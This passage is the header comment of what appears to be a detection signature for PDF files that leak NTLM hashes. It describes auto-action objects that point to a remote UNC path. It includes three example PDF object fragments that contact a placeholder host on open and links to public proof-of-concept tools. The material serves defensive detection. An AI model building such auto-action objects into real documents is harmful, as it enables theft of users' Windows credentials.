/*
This signature detects Adobe PDF files that reference a remote UNC object for the purpose of leaking NTLM hashes.
New methods for NTLM hash leaks are discovered from time to time. This particular one is triggered upon opening of a
malicious crafted PDF. Original write-up from CheckPoint:

    https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/

Public proof-of-concepts:

    https://github.com/deepzec/Bad-Pdf
    https://github.com/3gstudent/Worse-PDF

Requirements:
    /AA for Auto Action
    /O for open is functionally equivalent to /C for close.
    /S + /GoToE (Embedded) can be swapped with /GoToR (Remote).
    /D location reference.
    /F the UNC reference.

Multiple different arrangements, example one:

    /AA <<
        /O <<
            /F (\\\\10.20.30.40\\test)
            /D [ 0 /Fit]
            /S /GoToR
            >>
example two:

    /AA <<
        /C <<
            /D [ 0 /Fit]
            /S /GoToE
            /F (\\\\10.20.30.40\\test)
            >>

example three:

    /AA <<
        /O <<
            /D [ 0 /Fit]
            /F (\\\\10.20.30.40\\test)
            /S /GoToR
            >>

Multiple protocols supported for the /F include, both http and UNC.
